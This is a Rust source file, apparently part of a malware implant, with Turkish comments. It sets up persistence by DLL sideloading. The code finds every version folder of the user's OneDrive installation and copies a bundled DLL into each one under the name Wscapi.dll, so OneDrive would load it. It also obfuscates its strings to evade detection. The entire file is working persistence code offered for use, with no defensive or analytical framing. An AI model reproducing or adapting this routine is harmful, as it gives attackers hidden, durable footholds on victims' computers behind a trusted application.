use std::fs;
use std::env;
use std::path::PathBuf;
use obfuscator::obfuscate_string;

pub fn setup_persistence() -> Result<(), Box<dyn std::error::Error>> {
    let current_exe = env::current_exe()?;
    let current_dir = current_exe.parent().ok_or("Current directory not found")?;
    let source_dll = current_dir.join(obfuscate_string!("libcares-2.dll"));

    if !source_dll.exists() {
        return Err(format!("DLL bulunamadı: {:?}", source_dll).into());
    }

    let local_appdata = env::var(obfuscate_string!("LOCALAPPDATA"))?;
    let onedrive_base = std::path::Path::new(&local_appdata)
        .join(obfuscate_string!("Microsoft"))
        .join(obfuscate_string!("OneDrive"));

    if !onedrive_base.exists() {
        return Err(obfuscate_string!("OneDrive klasörü bulunamadı").into());
    }

    // Tüm sürüm adaylarını topla (sadece klasör adı sürüm formatında olanlar)
    let mut candidates: Vec<PathBuf> = Vec::new();

    for entry in fs::read_dir(&onedrive_base)? {
        let entry = entry?;
        let path = entry.path();

        if !path.is_dir() {
            continue;
        }

        let name = match path.file_name().and_then(|n| n.to_str()) {
            Some(name) => name,
            None => continue, // UTF-8 olmayan isimleri atla
        };

        // Sürüm numarası formatını kontrol et (örn: "26.026.0209.0004")
        // En az bir nokta içermeli ve tüm parçalar sayısal olmalı
        let version_parts: Vec<u32> = name
            .split('.')
            .filter_map(|part| part.parse::<u32>().ok())
            .collect();

        if version_parts.is_empty() || !name.contains('.') {
            continue;
        }

        candidates.push(path);
    }

    if candidates.is_empty() {
        return Err(obfuscate_string!("Hiçbir OneDrive sürüm klasörü bulunamadı").into());
    }

    // Tüm aday klasörlere kopyalamayı dene
    let mut success_count = 0;
    let mut errors = Vec::new();

    for version_dir in candidates {
        let target_dll = version_dir.join(obfuscate_string!("Wscapi.dll"));

        if target_dll.exists() {
            success_count += 1;
            continue;
        }

        // Kopyalamayı dene, hata olursa kaydet ve devam et
        match fs::copy(&source_dll, &target_dll) {
            Ok(_) => {
                println!("DLL başarıyla kopyalandı: {:?}", target_dll);
                success_count += 1;
            }
            Err(e) => {
                let err_msg = format!("DLL kopyalanamadı {:?}: {}", target_dll, e);
                eprintln!("{}", err_msg);
                errors.push(err_msg);
            }
        }
    }

    if success_count == 0 {
        Err(format!("Hiçbir klasöre kopyalama yapılamadı. Hatalar: {:?}", errors).into())
    } else {
        Ok(())
    }
}
